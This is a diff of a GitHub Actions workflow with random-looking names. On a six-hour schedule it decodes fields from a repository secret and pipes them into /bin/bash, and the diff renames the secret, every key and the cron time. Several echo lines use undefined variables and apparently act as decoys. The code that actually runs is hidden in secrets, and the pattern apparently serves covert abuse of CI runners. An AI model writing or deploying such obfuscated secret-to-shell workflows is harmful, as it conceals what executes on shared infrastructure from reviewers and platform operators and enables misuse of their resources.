@@ -1,8 +1,9 @@
 name: zhangshancui4657
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 1/6 * * *'
+    - cron: '36 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +11,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhangshancui4657
         env:
-          d2: ${{ secrets.d2 }}
+          plmuz52: ${{ secrets.plmuz52 }}
         run: |
-          echo $d2 | jq -r .qyrou9232 | /bin/bash
-          echo $vek2 | jq -r .szoxu61 | /bin/bash
-          echo $q409 | jq -r .x43 | /bin/bash
-          echo $s1 | jq -r .cexfq0177 | /bin/bash
-          echo $lcyxf032 | jq -r .f3369 | /bin/bash
-          echo $tzd303 | jq -r .rno0 | /bin/bash
-          echo $mlm186 | jq -r .wuz3 | /bin/bash
+          echo $plmuz52 | jq -r .ppaoe1312 | /bin/bash
+          echo $upq4126 | jq -r .p1 | /bin/bash
+          echo $r685 | jq -r .tzj34058 | /bin/bash
+          echo $gkh29 | jq -r .pbks423 | /bin/bash
+          echo $ynr8 | jq -r .d14373 | /bin/bash
 
